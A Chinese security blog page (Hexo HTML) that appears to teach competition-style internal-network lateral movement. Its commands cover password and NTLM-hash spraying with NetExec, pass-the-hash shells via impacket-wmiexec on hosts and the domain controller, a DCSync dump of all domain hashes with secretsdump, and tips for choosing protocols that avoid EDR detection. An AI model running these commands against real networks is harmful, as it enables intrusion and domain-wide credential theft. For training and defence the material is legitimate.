@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="VnNixUxQwNBvFc-nAdXdfYkKhdk4ncl53flMSHEm1gw">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":300,"display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="原理简述宏观类比：横向执行如同拿着上一步窃取来的“钥匙”（凭证），通过大楼内部合法的“员工通道”（系统原生管理协议）去直接开目标房间的门。不砸门（不利用漏洞）、不翻窗（不传木马），直接以合法主人的身份走进去。 技术定义：利用获取到的明文密码或 NTLM Hash，结合 Windows 原生远程管理协议（SMB、WMI、WinRM），在代理隧道的加持下，实现对内网目标主机的远程命令执行与权限接管（R">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网横向4：横向击杀与执行">
+<meta property="og:url" content="http://example.com/2026/03/21/ISW/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%914_%E6%A8%AA%E5%90%91%E5%87%BB%E6%9D%80%E4%B8%8E%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="s0m1ng">
+<meta property="og:description" content="原理简述宏观类比：横向执行如同拿着上一步窃取来的“钥匙”（凭证），通过大楼内部合法的“员工通道”（系统原生管理协议）去直接开目标房间的门。不砸门（不利用漏洞）、不翻窗（不传木马），直接以合法主人的身份走进去。 技术定义：利用获取到的明文密码或 NTLM Hash，结合 Windows 原生远程管理协议（SMB、WMI、WinRM），在代理隧道的加持下，实现对内网目标主机的远程命令执行与权限接管（R">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-03-21T09:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-21T14:50:00.487Z">
+<meta property="article:author" content="s0m1ng">
+<meta property="article:tag" content="横向移动">
+<meta property="article:tag" content="域控">
+<meta property="article:tag" content="横向执行">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2026/03/21/ISW/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%914_%E6%A8%AA%E5%90%91%E5%87%BB%E6%9D%80%E4%B8%8E%E6%89%A7%E8%A1%8C/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>内网横向4：横向击杀与执行 | s0m1ng</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="s0m1ng" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">s0m1ng</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">二进制学习中</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+  <a href="https://github.com/som1ng" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/21/ISW/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%914_%E6%A8%AA%E5%90%91%E5%87%BB%E6%9D%80%E4%B8%8E%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/profile_photo.jpg">
+      <meta itemprop="name" content="s0m1ng">
+      <meta itemprop="description" content="逆向学习中~">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="s0m1ng">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          内网横向4：横向击杀与执行
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2026-03-21 17:00:00 / 修改时间：22:50:00" itemprop="dateCreated datePublished" datetime="2026-03-21T17:00:00+08:00">2026-03-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ISW/" itemprop="url" rel="index"><span itemprop="name">ISW</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ISW/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">内网横向</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+  
+  <h1 id="原理简述"><a href="#原理简述" class="headerlink" title="原理简述"></a>原理简述</h1><p><strong>宏观类比</strong>：横向执行如同拿着上一步窃取来的“钥匙”（凭证），通过大楼内部合法的“员工通道”（系统原生管理协议）去直接开目标房间的门。不砸门（不利用漏洞）、不翻窗（不传木马），直接以合法主人的身份走进去。</p>
+<p><strong>技术定义</strong>：利用获取到的明文密码或 NTLM Hash，结合 Windows 原生远程管理协议（SMB、WMI、WinRM），在代理隧道的加持下，实现对内网目标主机的远程命令执行与权限接管（RCE）。</p>
+<h1 id="核心武器库准备与规范"><a href="#核心武器库准备与规范" class="headerlink" title="核心武器库准备与规范"></a>核心武器库准备与规范</h1><p>在攻击机（Ubuntu）本地储备以下两款基于 Python 的协议级横向大杀器。</p>
+<h2 id="底层协议操控包：Impacket"><a href="#底层协议操控包：Impacket" class="headerlink" title="底层协议操控包：Impacket"></a>底层协议操控包：Impacket</h2><p>最核心的横向工具集，将 Windows 闭源的 SMB/RPC/DCOM 协议用 Python 完全重写，支持在 Linux 下直接发起 Windows 认证。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install python3-impacket -y</span><br><span class="line"><span class="comment"># 核心调用脚本：impacket-psexec, impacket-wmiexec, impacket-smbexec</span></span><br></pre></td></tr></table></figure>
+<h2 id="自动化横向喷洒工具：NetExec-原-CrackMapExec"><a href="#自动化横向喷洒工具：NetExec-原-CrackMapExec" class="headerlink" title="自动化横向喷洒工具：NetExec (原 CrackMapExec)"></a>自动化横向喷洒工具：NetExec (原 CrackMapExec)</h2><p>内网自动化撞库与横向移动的工业级标准工具（CME 的现代接替者），支持并发多线程协议探测与哈希传递。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p ~/ISW_Workspace/Tools/Lateral/NetExec &amp;&amp; <span class="built_in">cd</span> ~/ISW_Workspace/Tools/Lateral/NetExec</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载 Linux 编译好的单文件版 (官方目前将其打包成了 zip)</span></span><br><span class="line">wget https://github.com/Pennyw0rth/NetExec/releases/latest/download/nxc-ubuntu-latest.zip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压获取二进制文件</span></span><br><span class="line">unzip nxc-ubuntu-latest.zip</span><br><span class="line"><span class="built_in">chmod</span> +x nxc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 移动到系统路径，使其在任何目录下均可直接通过 nxc 命令调用</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mv</span> nxc /usr/local/bin/nxc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证安装</span></span><br><span class="line">nxc --version</span><br></pre></td></tr></table></figure>
+<h1 id="工作组环境横向战术"><a href="#工作组环境横向战术" class="headerlink" title="工作组环境横向战术"></a>工作组环境横向战术</h1><p><strong>架构研判</strong>：目标机器之间互不信任，无集中化管理。 <strong>核心打法</strong>：密码复用喷洒 (Password Spraying)。即假设网管为了运维方便，所有机器的本地 Administrator 密码完全一致。</p>
+<h2 id="NetExec-自动化密码-哈希喷洒-批量撞库"><a href="#NetExec-自动化密码-哈希喷洒-批量撞库" class="headerlink" title="NetExec 自动化密码/哈希喷洒 (批量撞库)"></a>NetExec 自动化密码/哈希喷洒 (批量撞库)</h2><p>利用上一步抓到的本地管理员凭证，对 <code>&lt;目标内网网段&gt;</code> 进行并发 SMB 登录尝试。</p>
+<p><strong>明文密码喷洒：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nxc smb &lt;目标内网网段&gt; -u &lt;本地用户名&gt; -p <span class="string">&#x27;&lt;明文密码&gt;&#x27;</span> --local-auth</span><br></pre></td></tr></table></figure>
+<p><strong>哈希传递 (PtH) 喷洒：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nxc smb &lt;目标内网网段&gt; -u &lt;本地用户名&gt; -H &lt;NTLM_Hash&gt; --local-auth</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>技术解析</strong>：<code>--local-auth</code> 强制指定为本地 SAM 认证而非域认证。回显中标记为 <code>Pwn3d!</code> 的 IP，即代表凭证复用成功，已获取最高控制权。</li>
+</ul>
+<h2 id="Impacket-建立交互式-Shell-单点突破"><a href="#Impacket-建立交互式-Shell-单点突破" class="headerlink" title="Impacket 建立交互式 Shell (单点突破)"></a>Impacket 建立交互式 Shell (单点突破)</h2><p>针对喷洒成功的 <code>&lt;目标内网IP&gt;</code>，建立远程命令行会话。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-wmiexec &lt;本地用户名&gt;@&lt;目标内网IP&gt; -hashes 00000000000000000000000000000000:&lt;NTLM_Hash&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>技术解析</strong>：WMI 协议（TCP 135 及高端口）基于 RPC 调用，无实体文件落地，隐蔽性极高，规避了传统 PsExec 在目标机器产生 <code>PSEXESVC</code> 服务的特征报警。</li>
+</ul>
+<h1 id="域环境横向战术"><a href="#域环境横向战术" class="headerlink" title="域环境横向战术"></a>域环境横向战术</h1><p><strong>架构研判</strong>：存在集中认证中心 (DC)，域账户的凭据缓存在任意登录过的机器内存中。 <strong>核心打法</strong>：哈希传递 (PtH) 直击域控，或寻找域管进程进行令牌窃取。终极目标是接管 DC，执行 DCSync 导出全域哈希 (NTDS.dit)。</p>
+<h2 id="定向哈希传递-PtH-击杀域控"><a href="#定向哈希传递-PtH-击杀域控" class="headerlink" title="定向哈希传递 (PtH) 击杀域控"></a>定向哈希传递 (PtH) 击杀域控</h2><p>如果上一步在跳板机抓到了属于 <strong>Domain Admins (域管组)</strong> 的 <code>&lt;域管用户名&gt;</code> 和 <code>&lt;NTLM_Hash&gt;</code>，直接利用代理对 <code>&lt;域控内网IP&gt;</code> 发起斩首行动。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-wmiexec &lt;目标域名&gt;/&lt;域管用户名&gt;@&lt;域控内网IP&gt; -hashes 00000000000000000000000000000000:&lt;NTLM_Hash&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>技术解析</strong>：注意用户名格式必须前置 <code>&lt;目标域名&gt;/</code> 声明域身份验证。通过 NTLM 协议将哈希直接提交给目标机器的 LSA 进行响应计算，无需破解明文即可获取 SYSTEM Shell。</li>
+</ul>
+<h2 id="DCSync-全域接管-终局清场"><a href="#DCSync-全域接管-终局清场" class="headerlink" title="DCSync 全域接管 (终局清场)"></a>DCSync 全域接管 (终局清场)</h2><p>在成功获取域控的交互式 Shell 后，你已经拥有域的最高权限。使用 <code>secretsdump</code> 模拟域控同步协议，直接导出全域所有用户的哈希。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-secretsdump &lt;目标域名&gt;/&lt;域管用户名&gt;@&lt;域控内网IP&gt; -hashes 00000000000000000000000000000000:&lt;NTLM_Hash&gt; -just-dc</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>技术解析</strong>：<code>-just-dc</code> 触发 DRSUAPI (目录复制服务 RPC)，迫使 DC 吐出包括 <code>krbtgt</code> 在内的所有核心账户哈希。至此，内网宣告彻底沦陷。</li>
+</ul>
+<h1 id="横向执行协议隐蔽性分级"><a href="#横向执行协议隐蔽性分级" class="headerlink" title="横向执行协议隐蔽性分级"></a>横向执行协议隐蔽性分级</h1><p>实战中必须根据目标主机的杀软级别（EDR/AV）选择合适的横向协议。</p>
+<ol>
+<li><p><strong>WinRM 协议 (最隐蔽 / <code>evil-winrm</code>)</strong></p>
+<ul>
+<li><p><strong>依赖端口</strong>：TCP 5985 (HTTP) / 5986 (HTTPS)</p>
+</li>
+<li><p><strong>特征</strong>：完全基于系统原生 PowerShell 远程管理，极其干净，无任何告警。若端口开放，<strong>首选</strong>。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>WMI 协议 (隐蔽 / <code>wmiexec</code>)</strong></p>
+<ul>
+<li><p><strong>依赖端口</strong>：TCP 135 及 49152-65535 (动态 RPC)</p>
+</li>
+<li><p><strong>特征</strong>：无二进制文件落地，无新服务创建日志。<strong>次选</strong>。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>SMB 协议 (极度嘈杂 / <code>psexec</code>)</strong></p>
+<ul>
+<li><p><strong>依赖端口</strong>：TCP 445</p>
+</li>
+<li><p><strong>特征</strong>：必须通过 <code>ADMIN$</code> 共享上传可执行文件，并调用 Service Control Manager 创建服务。必然触发 Windows Event ID 7045 及杀软拦截。<strong>仅在无杀软或降级攻击时使用</strong>。</p>
+</li>
+</ul>
+</li>
+</ol>
+<h1 id="赛场异常处置规范"><a href="#赛场异常处置规范" class="headerlink" title="赛场异常处置规范"></a>赛场异常处置规范</h1><ol>
+<li><p><strong>工作组横向提示 Access Denied (UAC 拦截)</strong></p>
+<ul>
+<li><p><strong>痛点</strong>：在工作组环境中，即使你掌握了目标机的本地管理员组用户（非内建 Administrator）的正确密码，通过 WMI/SMB 登录依然被拒。这是因为 Windows UAC 的 <code>LocalAccountTokenFilterPolicy</code>（本地账户令牌过滤策略）默认剥夺了网络登录的管理员权限。</p>
+</li>
+<li><p><strong>规范应对</strong>：仅内建的 <code>Administrator</code> 账户（RID 500）不受此 UAC 策略限制。工作组横向<strong>必须优先</strong>喷洒 <code>Administrator</code> 账户。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>WMI 协议挂代理执行卡死 (RPC 动态端口不通)</strong></p>
+<ul>
+<li><p><strong>痛点</strong>：WMI 认证初期使用 135 端口协商，但后续通信会随机分配一个高危动态端口（如 49154）。如果内网防火墙阻断了高端口，或者 SOCKS5 代理对多路 RPC 转发处理异常，<code>wmiexec</code> 会长时间无响应。</p>
+</li>
+<li><p><strong>规范应对</strong>：若 <code>wmiexec</code> 卡死，降级使用 <code>impacket-smbexec</code>。该工具纯依赖 TCP 445 端口进行命令执行与回显读取，无需动态端口支持。</p>
+</li>
+</ul>
+</li>
+</ol>
+
+
+
+    
+    
+    
+        <div class="reward-container">
+  <div>您的支持将鼓励我继续创作!</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/reward.jpg" alt="s0m1ng 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>s0m1ng
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2026/03/21/ISW/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%914_%E6%A8%AA%E5%90%91%E5%87%BB%E6%9D%80%E4%B8%8E%E6%89%A7%E8%A1%8C/" title="内网横向4：横向击杀与执行">http://example.com/2026/03/21/ISW/内网渗透与横向移动/内网横向4_横向击杀与执行/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" rel="tag"><i class="fa fa-tag"></i> 横向移动</a>
+              <a href="/tags/%E5%9F%9F%E6%8E%A7/" rel="tag"><i class="fa fa-tag"></i> 域控</a>
+              <a href="/tags/%E6%A8%AA%E5%90%91%E6%89%A7%E8%A1%8C/" rel="tag"><i class="fa fa-tag"></i> 横向执行</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/03/21/ISW/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%913_%E5%87%AD%E8%AF%81%E7%AA%83%E5%8F%96%E4%B8%8E%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/" rel="prev" title="内网横向3：凭证窃取与密码抓取">
+      <i class="fa fa-chevron-left"></i> 内网横向3：凭证窃取与密码抓取
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/03/21/ISW/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%915_%E6%A8%AA%E5%90%91%E5%85%A8%E8%87%AA%E5%8A%A8%E5%B7%A5%E5%85%B7/" rel="next" title="内网横向5：横向全自动工具MSF">
+      内网横向5：横向全自动工具MSF <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E7%AE%80%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">原理简述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E6%AD%A6%E5%99%A8%E5%BA%93%E5%87%86%E5%A4%87%E4%B8%8E%E8%A7%84%E8%8C%83"><span class="nav-number">2.</span> <span class="nav-text">核心武器库准备与规范</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%95%E5%B1%82%E5%8D%8F%E8%AE%AE%E6%93%8D%E6%8E%A7%E5%8C%85%EF%BC%9AImpacket"><span class="nav-number">2.1.</span> <span class="nav-text">底层协议操控包：Impacket</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A8%AA%E5%90%91%E5%96%B7%E6%B4%92%E5%B7%A5%E5%85%B7%EF%BC%9ANetExec-%E5%8E%9F-CrackMapExec"><span class="nav-number">2.2.</span> <span class="nav-text">自动化横向喷洒工具：NetExec (原 CrackMapExec)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84%E7%8E%AF%E5%A2%83%E6%A8%AA%E5%90%91%E6%88%98%E6%9C%AF"><span class="nav-number">3.</span> <span class="nav-text">工作组环境横向战术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NetExec-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AF%86%E7%A0%81-%E5%93%88%E5%B8%8C%E5%96%B7%E6%B4%92-%E6%89%B9%E9%87%8F%E6%92%9E%E5%BA%93"><span class="nav-number">3.1.</span> <span class="nav-text">NetExec 自动化密码&#x2F;哈希喷洒 (批量撞库)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Impacket-%E5%BB%BA%E7%AB%8B%E4%BA%A4%E4%BA%92%E5%BC%8F-Shell-%E5%8D%95%E7%82%B9%E7%AA%81%E7%A0%B4"><span class="nav-number">3.2.</span> <span class="nav-text">Impacket 建立交互式 Shell (单点突破)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%A8%AA%E5%90%91%E6%88%98%E6%9C%AF"><span class="nav-number">4.</span> <span class="nav-text">域环境横向战术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9A%E5%90%91%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92-PtH-%E5%87%BB%E6%9D%80%E5%9F%9F%E6%8E%A7"><span class="nav-number">4.1.</span> <span class="nav-text">定向哈希传递 (PtH) 击杀域控</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DCSync-%E5%85%A8%E5%9F%9F%E6%8E%A5%E7%AE%A1-%E7%BB%88%E5%B1%80%E6%B8%85%E5%9C%BA"><span class="nav-number">4.2.</span> <span class="nav-text">DCSync 全域接管 (终局清场)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E6%89%A7%E8%A1%8C%E5%8D%8F%E8%AE%AE%E9%9A%90%E8%94%BD%E6%80%A7%E5%88%86%E7%BA%A7"><span class="nav-number">5.</span> <span 